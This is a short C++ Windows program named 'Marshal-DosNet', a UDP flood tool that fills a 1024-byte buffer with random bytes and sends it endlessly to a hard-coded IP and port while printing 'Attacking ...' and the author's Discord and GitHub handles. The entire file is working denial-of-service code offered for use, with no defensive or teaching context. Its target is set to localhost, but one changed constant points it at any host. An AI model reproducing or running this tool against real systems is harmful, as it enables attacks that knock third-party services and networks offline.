#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <WinSock2.h>
#include <Windows.h>

#pragma comment(lib, "ws2_32.lib")

const char* IP = "127.0.0.1";
const int PORT = 80;

int main() {
	SetConsoleTitle(TEXT("Marshal-DosNet"));
	system("mode con: cols=40 lines=6");
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
	
	WSADATA wsaData;
	int wsa = WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET hListen;
	hListen = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);

	SOCKADDR_IN Target = {};
	Target.sin_family = AF_INET;
	Target.sin_addr.s_addr = inet_addr(IP);
	Target.sin_port = PORT;

	SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	std::cout << "IP : " << IP << std::endl;
	std::cout << "PORT : " << PORT << std::endl;
	std::cout << "STATE : Attacking ..." << std::endl;
	std::cout << "Discord : Marshal#0129" << std::endl;
	std::cout << "Github : https://github.com/Marshal0129" << std::endl;

	char packet[1024]{ 0 };
	for (int i = 0; i < 1024; i++) {
		packet[i] = rand();
	}

	while (true) {
		sendto(sock, packet, sizeof(packet), 0, reinterpret_cast<sockaddr*>(&Target), sizeof(SOCKADDR_IN));
	}
	return 0;
}